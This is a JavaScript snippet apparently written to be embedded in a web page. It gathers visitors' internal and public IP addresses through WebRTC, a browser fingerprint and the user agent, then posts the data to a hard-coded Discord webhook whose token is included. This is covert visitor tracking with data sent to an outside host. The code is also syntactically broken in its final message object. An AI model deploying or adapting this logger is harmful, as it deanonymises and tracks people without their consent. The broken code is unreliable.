var userData = { 
     "internalIPs": [], 
     "externalIPs": {"ipv4": [], "ipv6": []}, 
     "fingerprintHash": '', 
     "userAgent": navigator.userAgent 
 } 
  
 getIPs(function(ip){ 
     //local IPs 
     if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) 
         userData.internalIPs.push(ip); 
     //IPv6 addresses 
     else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) 
         userData.externalIPs["ipv6"].push(ip); 
     //assume the rest are public IPs 
     else 
         userData.externalIPs["ipv4"].push(ip); 
 }); 
  
 new Fingerprint2().get(function(fingerprint, components){ 
   // this will use all available fingerprinting sources 
   userData.fingerprintHash = fingerprint 
  
   // components is an array of all fingerprinting components used 
 }); 
  
 var sendInfo = function(endpoint){ 
     setTimeout(function(){ 
         var xhr = new XMLHttpRequest(); 
         xhr.open("POST", endpoint, true); 
         xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8'); 
         // send the collected data as JSON 
         xhr.send(JSON.stringify(userData)); 
         xhr.onloadend = function () { 
         // done 
         }  
     }, 3000) 
 }
var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
  return response.json();
})
.then(function(data) {
  ip = data.ip;
  var webhook = 'https://discord.com/api/webhooks/1129328426503905351/rX4l5Sv1Y0UAYbrmzFj6G2jyRroHyOnhXfeyS-0knV9eabFntCPfjqZ4hnAzXxVp6FQD'
  var message = {
    content: 'IP:' + ip
             'USER DATA:' + userData
  };

      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      });
});
